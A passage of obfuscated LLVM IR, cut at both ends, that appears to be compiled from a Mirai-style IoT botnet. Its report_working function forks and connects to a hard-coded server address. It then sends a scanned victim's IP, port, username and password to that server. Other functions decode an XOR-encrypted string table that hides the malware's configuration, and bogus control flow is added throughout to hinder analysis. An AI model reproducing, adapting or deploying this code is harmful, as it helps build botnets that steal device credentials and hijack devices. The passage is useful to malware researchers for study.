; <label>:69:                                     ; preds = %originalBBpart26, %50, %35
  %70 = load i32, i32* %10, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %1
  %71 = alloca i32, align 4
  %72 = alloca %struct.scanner_connection*, align 8
  %73 = alloca i8*, align 8
  %74 = alloca i32, align 4
  %75 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %72, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %76 = call i8* @table_retrieve_val(i32 10, i32* %75)
  store i8* %76, i8** %73, align 8
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %72, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 7
  %79 = getelementptr inbounds [256 x i8], [256 x i8]* %78, i32 0, i32 0
  %80 = load %struct.scanner_connection*, %struct.scanner_connection** %72, align 8
  %81 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %80, i32 0, i32 6
  %82 = load i32, i32* %81, align 4
  %83 = load i8*, i8** %73, align 8
  %84 = load i32, i32* %75, align 4
  %_ = shl i32 %84, 1
  %_1 = shl i32 %84, 1
  %_2 = sub i32 0, %84
  %gen = add i32 %_2, 1
  %_3 = shl i32 %84, 1
  %85 = sub nsw i32 %84, 1
  %86 = call i32 @util_memsearch(i8* %79, i32 %82, i8* %83, i32 %85)
  %87 = icmp ne i32 %86, -1
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %51
  %88 = load i32, i32* %13, align 4
  store i32 %88, i32* %10, align 4
  br label %originalBB4
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  ret void

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  call void @exit(i32 0) #8
  unreachable

; <label>:23:                                     ; preds = %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  br label %20

; <label>:20:                                     ; preds = %58, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %61

; <label>:25:                                     ; preds = %20
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = xor i32 %31, 222
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %29, align 1
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 222
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 251
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 175
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  br label %58

; <label>:58:                                     ; preds = %25
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %20

; <label>:61:                                     ; preds = %20
  %62 = load i8*, i8** %6, align 8
  ret i8* %62
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %99, %1
  %28 = load i32, i32* @x.83
  %29 = load i32, i32* @y.84
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %3, align 4
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = icmp slt i32 %36, %40
  %42 = load i32, i32* @x.83
  %43 = load i32, i32* @y.84
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %41, label %50, label %102

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, %52
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %58, align 1
  %63 = load i8, i8* %6, align 1
  %64 = zext i8 %63 to i32
  %65 = load %struct.table_value*, %struct.table_value** %4, align 8
  %66 = getelementptr inbounds %struct.table_value, %struct.table_value* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = load i32, i32* %3, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, %64
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %70, align 1
  %75 = load i8, i8* %7, align 1
  %76 = zext i8 %75 to i32
  %77 = load %struct.table_value*, %struct.table_value** %4, align 8
  %78 = getelementptr inbounds %struct.table_value, %struct.table_value* %77, i32 0, i32 0
  %79 = load i8*, i8** %78, align 8
  %80 = load i32, i32* %3, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8, i8* %79, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = xor i32 %84, %76
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %82, align 1
  %87 = load i8, i8* %8, align 1
  %88 = zext i8 %87 to i32
  %89 = load %struct.table_value*, %struct.table_value** %4, align 8
  %90 = getelementptr inbounds %struct.table_value, %struct.table_value* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = load i32, i32* %3, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8, i8* %91, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = xor i32 %96, %88
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %94, align 1
  br label %99

; <label>:99:                                     ; preds = %50
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %27

; <label>:102:                                    ; preds = %originalBBpart2
  %103 = load i32, i32* @x.83
  %104 = load i32, i32* @y.84
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %102
  %111 = load i32, i32* @x.83
  %112 = load i32, i32* @y.84
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %27
  %119 = load i32, i32* %3, align 4
  %120 = load %struct.table_value*, %struct.table_value** %4, align 8
  %121 = getelementptr inbounds %struct.table_value, %struct.table_value* %120, i32 0, i32 1
  %122 = load i16, i16* %121, align 8
  %123 = zext i16 %122 to i32
  %124 = icmp slt i32 %119, %123
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %102
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = load i32, i32* @x.87
  %4 = load i32, i32* @y.88
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %11, align 4
  store i32* %1, i32** %12, align 8
  %14 = load i32, i32* %11, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %15
  store %struct.table_value* %16, %struct.table_value** %13, align 8
  %17 = load i32*, i32** %12, align 8
  %18 = icmp ne i32* %17, null
  %19 = load i32, i32* @x.87
  %20 = load i32, i32* @y.88
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %18, label %27, label %33

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load %struct.table_value*, %struct.table_value** %13, align 8
  %29 = getelementptr inbounds %struct.table_value, %struct.table_value* %28, i32 0, i32 1
  %30 = load i16, i16* %29, align 8
  %31 = zext i16 %30 to i32
  %32 = load i32*, i32** %12, align 8
  store i32 %31, i32* %32, align 4
  br label %33

; <label>:33:                                     ; preds = %27, %originalBBpart2
  %34 = load i32, i32* @x.87
  %35 = load i32, i32* @y.88
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load %struct.table_value*, %struct.table_value** %13, align 8
  %43 = getelementptr inbounds %struct.table_value, %struct.table_value* %42, i32 0, i32 0
  %44 = load i8*, i8** %43, align 8
  %45 = load i32, i32* @x.87
  %46 = load i32, i32* @y.88
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i8* %44

originalBBalteredBB:                              ; preds = %originalBB, %2
  %53 = alloca i32, align 4
  %54 = alloca i32*, align 8
  %55 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %53, align 4
  store i32* %1, i32** %54, align 8
  %56 = load i32, i32* %53, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %57
  store %struct.table_value* %58, %struct.table_value** %55, align 8
  %59 = load i32*, i32** %54, align 8
  %60 = icmp ne i32* %59, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %61 = load %struct.table_value*, %struct.table_value** %13, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %130

; <label>:16:                                     ; preds = %4
  %17 = load i32, i32* @x.89
  %18 = load i32, i32* @y.90
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  store i32 0, i32* %10, align 4
  %25 = load i32, i32* @x.89
  %26 = load i32, i32* @y.90
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart227, %originalBBpart2
  %34 = load i32, i32* %10, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %129

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.89
  %39 = load i32, i32* @y.90
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i8*, i8** %6, align 8
  %47 = load i32, i32* %10, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = load i8*, i8** %8, align 8
  %53 = load i32, i32* %11, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %51, %57
  %59 = load i32, i32* @x.89
  %60 = load i32, i32* @y.90
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %67, label %108

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* %11, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %11, align 4
  %70 = load i32, i32* %9, align 4
  %71 = icmp eq i32 %69, %70
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* @x.89
  %74 = load i32, i32* @y.90
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %72
  %81 = load i32, i32* %10, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %5, align 4
  %83 = load i32, i32* @x.89
  %84 = load i32, i32* @y.90
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %130

; <label>:91:                                     ; preds = %67
  %92 = load i32, i32* @x.89
  %93 = load i32, i32* @y.90
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %91
  %100 = load i32, i32* @x.89
  %101 = load i32, i32* @y.90
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %109

; <label>:108:                                    ; preds = %originalBBpart24
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %originalBBpart215
  br label %110

; <label>:110:                                    ; preds = %109
  %111 = load i32, i32* @x.89
  %112 = load i32, i32* @y.90
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %110
  %119 = load i32, i32* %10, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %10, align 4
  %121 = load i32, i32* @x.89
  %122 = load i32, i32* @y.90
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart227, label %originalBB17alteredBB

originalBBpart227:                                ; preds = %originalBB17
  br label %33

; <label>:129:                                    ; preds = %33
  store i32 -1, i32* %5, align 4
  br label %130

; <label>:130:                                    ; preds = %129, %originalBBpart211, %15
  %131 = load i32, i32* @x.89
  %132 = load i32, i32* @y.90
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %130
  %139 = load i32, i32* %5, align 4
  %140 = load i32, i32* @x.89
  %141 = load i32, i32* @y.90
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  ret i32 %139

originalBBalteredBB:                              ; preds = %originalBB, %16
  store i32 0, i32* %10, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %148 = load i8*, i8** %6, align 8
  %149 = load i32, i32* %10, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %148, i64 %150
  %152 = load i8, i8* %151, align 1
  %153 = sext i8 %152 to i32
  %154 = load i8*, i8** %8, align 8
  %155 = load i32, i32* %11, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8, i8* %154, i64 %156
  %158 = load i8, i8* %157, align 1
  %159 = sext i8 %158 to i32
  %160 = icmp eq i32 %153, %159
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %72
  %161 = load i32, i32* %10, align 4
  %_ = sub i32 0, %161
